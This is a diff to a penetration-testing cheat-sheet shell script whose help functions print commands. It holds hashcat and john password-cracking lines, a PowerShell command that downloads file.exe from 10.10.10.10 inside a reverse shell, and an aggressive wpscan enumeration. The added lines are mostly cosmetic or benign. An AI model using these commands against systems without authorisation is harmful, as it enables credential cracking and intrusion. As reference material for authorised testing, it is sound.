@@ -82,28 +82,27 @@ function help-cracking () {
     echo $green
     echo 'unshadow passwd shadow > unshadow.db'
     echo 'john unshadow.db'
-    echo ${reset}${red}${bold}
+    echo ${reset}${white}${bold}
     echo 'Hashcat SHA512 $6$ shadow file'
     echo ${reset}${green}
     echo 'hashcat -m 1800 -a 0 hash.txt rockyou.txt --username'
-    echo ${reset}${red}${bold}
+    echo ${reset}${white}${bold}
     echo 'Hashcat MD5 $1$ shadow file'
     echo ${reset}${green}
     echo 'hashcat -m 500 -a 0 hash.txt rockyou.txt --username'
-    echo ${reset}${red}${bold}
+    echo ${reset}${white}${bold}
     echo 'Hashcat MD5 Apache webdav file'
     echo ${reset}${green}
     echo 'hashcat -m 1600 -a 0 hash.txt rockyou.txt'
-    echo ${reset}${red}${bold}
+    echo ${reset}${white}${bold}
     echo Hashcat SHA1
     echo ${reset}${green}
     echo 'hashcat -m 100 -a 0 hash.txt rockyou.txt --force'
-    echo ${reset}${red}${bold}
+    echo ${reset}${white}${bold}
     echo 'Hashcat Wordpress'
     echo ${reset}${green}
     echo 'hashcat -m 400 -a 0 --remove hash.txt rockyou.txt'
     echo $reset
-
 }
 
 
@@ -226,6 +225,15 @@ function help-filetransfer-http {
 
     # In reverse shell - Windows
     powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
+
+    # wget
+    wget -O report.pdf https://www.someplace.com/report_you_want.pdf
+
+    # curl
+    curl -o report.pdf https://www.someplace.com/report_you_want.pdf
+
+    # axel 
+    axel -a -n 20 -o report_axel.pdf https://www.someplace.com /reports/-sample-report-2013.pdf
 
 EOF
 }
@@ -398,7 +406,11 @@ echo "nikto -h 10.10.10.10"
 echo ${red}${bold}
 echo Wordpress scan
 echo ${reset}${green}
-echo "wpscan -u 10.10.10.10/wp/"
+echo "wpscan --url 10.10.10.10"
+echo ${reset}${white}
+echo Aggresive plugin detection
+echo ${reset}${green}
+echo "wpscan --url http://playground.cyberpunk.rs:81 --wp-content-dir /wp-content/ --enumerate vp --plugins-detection aggressive"
 }
 
 function help-portchecking {
@@ -573,5 +585,29 @@ function help-processes {
     echo ${green}
     echo "kill %1 #will kill job 1"
     echo
+    echo "jobs"
+    echo ""
+    echo "fg"
+    echo "bg"
 
 }
+
+function help-comparingfiles {
+    echo ${red}${bold}
+    echo "comparing files"
+    echo ${green}
+    echo "comm file1.txt file2.txt"
+    echo
+    echo "diff file1.txt file2.txt"
+    echo
+    echo "vimdiff file1.txt file2.txt"
+    echo ${white}
+    echo " ctrl-w and arrow = change windows"
+    echo " ] C change"
+    echo " [ C change "
+    echo " D + O other to current"
+    echo " D + P change in current to other"
+}
+
+
+
